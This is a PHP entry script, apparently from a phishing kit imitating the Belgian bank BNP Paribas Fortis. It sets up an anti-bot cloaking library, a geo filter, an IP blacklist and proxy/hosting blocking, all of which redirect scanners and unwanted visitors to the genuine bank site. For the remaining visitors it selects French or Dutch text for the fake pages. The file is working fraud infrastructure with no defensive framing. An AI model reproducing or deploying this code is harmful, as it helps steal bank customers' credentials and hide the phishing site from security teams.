<?php 
// error_reporting(0);
session_start();
require (__DIR__).'/config.php';
require (__DIR__).'/lang.php';
require (__DIR__).'/panel/panel.class.php';
require (__DIR__).'/lib/frm.php';
require (__DIR__).'/lib/md.php';
$pnl = new Panel();
$current_data = $pnl->getData();
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://www.bnpparibasfortis.be/");
$bm->setGeoFilter($geos);
$bm->setLicenseKey("");
$bm->setTestMode(false);

if(strtolower($antibot)=="yes"){
$bm->run();
}
 
$list = explode(",", file_get_contents((__DIR__)."/blacklisted_ips.txt"));
foreach($list as $bip){
    if($_SERVER['REMOTE_ADDR']==trim($bip)){
        header("location:".$bm->EXIT_LINK);
    }
}

if(strtolower($block_proxy)=="yes"){
    $proxy = $bm->getIpInfo('proxy');
    $hosting = $bm->getIpInfo('hosting');
    
    if($proxy OR $hosting){
        $bm->killBot("Detected proxy/hosting.");
        die(header("location: ".$bm->EXIT_LINK));
    }
    
}

$cc = "FR";



$browserLanguages = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$acceptedLanguages = explode(',', $browserLanguages);
foreach ($acceptedLanguages as $acceptedLanguage) {
    $languageCode = strtok($acceptedLanguage, '-');
    if (strtolower($languageCode) == 'nl') {
        $cc = "NL";
        break;
    } elseif (strtolower($languageCode) == 'fr') {
        $cc = "FR";
        break;
    }
}
 

function getLang($data){
    global $cc;
    global $lang;
    return $lang[$cc][$data];
}



?>